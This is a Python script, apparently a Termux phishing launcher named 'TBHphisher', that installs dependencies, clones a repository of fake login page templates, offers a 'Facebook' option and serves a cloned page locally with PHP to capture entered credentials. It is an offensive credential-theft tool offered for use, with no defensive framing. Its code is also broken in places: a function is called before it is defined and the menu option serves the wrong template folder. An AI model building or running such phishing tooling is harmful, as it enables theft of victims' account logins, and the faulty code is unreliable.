import os,random,sys,time
sys.stdout.write('\x1b]2; TBHphisher\x07') 
def clear():
	os.system('clear')

def slowprint(s):
	for c in s + '\n' :
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(5. / 100)


GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;46m'
R = '{RED}' 
G = '{GREEN}' 
Y = '\033[1;33m' 
Q = '\033[1;37m'
T = '\033[1;34m'
x = '\33[m' 
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
RED = '\033[1;31m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
sai="\033[1;30m"#ছাই
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
perpal = '\033[1;35m'
crim='\033[1;36m'
xa=46
xb=82
xc=118
xd=124
xe=154
xf=160
xg=190
xh=196
aa=random.choice([xa,xb,xc,xd,xe,xf,xg,xh])
aa= str(aa)
ba="\033[38;5;"+aa+"m"
ab=int(aa)
ab= ab + 1
ab=str(ab)
bb="\033[38;5;"+ab+"m"
ac=int(aa)
ac= ac + 2
ac=str(ac)
bc="\033[38;5;"+ac+"m"
ad=int(aa)
ad= ad + 3
ad=str(ad)
bd="\033[38;5;"+ad+"m" 
ae=int(aa)
ae= ae + 4
ae=str(ae)
be="\033[38;5;"+ae+"m"
af=int(aa)
af= af + 5
af=str(af)
bf="\033[38;5;"+af+"m"
ask  =     f"{YELLOW}[{BLUE}?{YELLOW}] "
success = f"{YELLOW}[{GREEN}√{YELLOW}] "
error  =    f"{YELLOW}[{RED}!{YELLOW}]{RED} Invalid Option !"
info  =   f"{YELLOW}[{GREEN}+{YELLOW}] "
info2  =   f"{YELLOW}[{GREEN}•{YELLOW}] "
error2 =    f"{crim}[{RED}!{crim}]{RED} "
cros=f"{YELLOW}[{RED}×{YELLOW}] {GREEN}"
led = f'{B} -{H}-{M}-{K}-{A}-{B}-{N}-{H}-{P}-{N}-{B}-{H}-{M}-{U}-{K}-{B}-{O}-{H}-{P}-{M}-{B}-{H}-{M}-{K}-{A}-{B}-{N}-{H}-{P}-{N}-{B}-{K}-{H}-{M}-{U}-{K}-{B}-{O}-{H}-{P}{M}-{B}'




from json import (
    dumps as stringify,
    loads as parse
)
from os import (
    getenv,
    kill,
    listdir,
    makedirs,
    mkdir,
    mknod,
    popen,
    remove,
)
from os.path import (
    abspath,
    basename,
    dirname,
    isdir,
    isfile,
    join
)
from platform import uname
import subprocess
from re import search, sub
from shutil import (
    copy2,
    get_terminal_size,
    rmtree,
)
from signal import (
    SIGINT,
)
from subprocess import (
    DEVNULL,
    PIPE,
    Popen,
    run
)

from sys import (
    stdout,
    version_info
)

from time import (
    sleep,
)


import importlib.util
port="8080"
modules = [ "requests", "rich", "bs4" ]
packages = [ "git", "php", "ssh" ]
local_url = f"127.0.0.1:{port}"
#  এটা রান করাতে হবে ওই ফোল্ডারে

for module_name in modules:
    if importlib.util.find_spec(module_name) is not None:
        pass
    else:
        slowprint(f"{GREEN}Installing {module_name}")
        run(f"pip3 install {module_name} --break-system-packages", shell=True)

def check_package_installed(package_name):
    try:
        result = subprocess.run(['pkg', 'list-installed'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if package_name in result.stdout:
            return True
        else:
            return False
    except Exception as e:
        print(f"An error occurred: {e}")
        return False

for package_name in packages:
    if check_package_installed(package_name):
        pass
    else:
        slowprint(f"{GREEN}Installing {package_name}")
        run(f"pkg install {package_name} -y", shell=True)

k=os.listdir()
if 'pysites' in k:
    pass
else:
    slowprint(f"{GREEN}Installing Site")
    shell(f"git clone https://gitlab.com/KasRoudra/pysites ")

















import requests
from requests import ( 
    get,
    post,
    head, 
    Session
)
from bs4 import BeautifulSoup
from requests.exceptions import ConnectionError
from rich.console import Console
from rich.panel import Panel
from rich.progress import (
    BarColumn,
    Progress,
    TextColumn,
    TimeRemainingColumn,
    TransferSpeedColumn
)
from rich.traceback import install as override_default_traceback

#internet checker 
def internet(url="https://api.github.com", timeout=5):
    while True:
        try:
            request = requests.get("https://www.google.com/", timeout=2)
            break
        except (requests.ConnectionError, requests.Timeout) as exception:
            print(f"\nNo internet!\007")
            time.sleep(2)

logo =f"""\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;91m ████████\033[0;92m ██████ \033[0;91m ██    ██\033[0;92m ███████\033[0;91m    ██████\033[0;92m ║
║\033[0;91m    ██ \033[0;92m   ██   ██\033[0;91m ██    ██ \033[0;92m     ██\033[0;91m   ██    ██\033[0;92m║
║\033[0;91m    ██ \033[0;92m   ██████ \033[0;91m ████████\033[0;92m ███████\033[0;91m   ██    ██\033[0;92m║
║\033[0;91m    ██ \033[0;92m   ██   ██\033[0;91m ██    ██\033[0;92m ██    \033[0;91m    ██    ██\033[0;92m║
║\033[0;91m    ██ \033[0;92m   ██████ \033[0;91m ██    ██\033[0;92m ███████\033[0;91m █  ██████\033[0;92m ║
║        {ba}____  __    _      __                \033[0;92m║
║       {bb}/ __ \/ /_  (_)____/ /_  ___  _____   \033[0;92m║
║      {bc}/ /_/ / __ \/ / ___/ __ \/ _ \/ ___/   \033[0;92m║
║     {bd}/ ____/ / / / (__  ) / / /  __/ /       \033[0;92m║
║    {be}/_/   /_/ /_/_/____/_/ /_/\___/_/        \033[0;92m║
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[0;92m"""

# Run shell commands in python
def shell(command, capture_output=False):
    try:
        return run(command, shell=True, capture_output=capture_output)
    except Exception as e:
        append(e, error_file)




def main():
    clear()
    print(logo)
    print(f"{YELLOW}[{GREEN}01{YELLOW}]{GREEN} Facebook")
    print(led)
    kali=input(f"{info2}{crim}ENTER YOUR CHOICE :- \033[33m")
    if kali in ["1","01","a","A"]:
        facebook()
    


def facebook():
    clear()
    print(logo)
    
    shell("cd pysites && cd google_old")
    shell("truncate -s 0 validate.php")
    shell(f"php -S {local_url}")
    url1=f"http://{local_url}"
    print(url1)
    















if (__name__ == "__main__"):
    clear()
    internet()
    main()
    